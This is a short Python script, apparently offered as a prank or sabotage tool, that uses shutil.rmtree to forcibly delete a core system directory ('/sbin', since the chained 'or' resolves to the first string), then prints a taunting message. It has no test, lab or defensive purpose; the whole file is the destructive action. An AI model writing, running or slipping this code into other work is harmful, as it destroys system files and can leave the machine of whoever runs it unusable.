import shutil

folder_path = "/sbin" or "/bin" or"/usr" or "/system" or "/root"

# Forcefully remove the directory and everything inside
shutil.rmtree(folder_path)

print(f"{folder_path} Gash™")
